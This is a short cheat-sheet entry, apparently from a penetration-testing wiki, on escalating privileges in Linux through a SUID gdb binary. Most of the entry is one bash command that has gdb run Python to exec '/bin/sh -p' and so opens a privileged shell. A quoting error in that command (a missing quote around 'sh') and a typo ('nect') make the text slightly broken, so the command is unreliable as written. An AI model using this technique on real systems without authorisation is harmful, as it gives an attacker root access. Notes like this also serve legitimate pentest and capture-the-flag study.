# Linux Privilege Escalation

## SUID Binaries

### gdb

If the binary gdb is SUID, you can do a Privilege Escalation with the nect command:

{% hint style="info" %}
With this command you need to have installed python in the machine.
{% endhint %}

```bash
./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh, "-p")' -ex quit
```
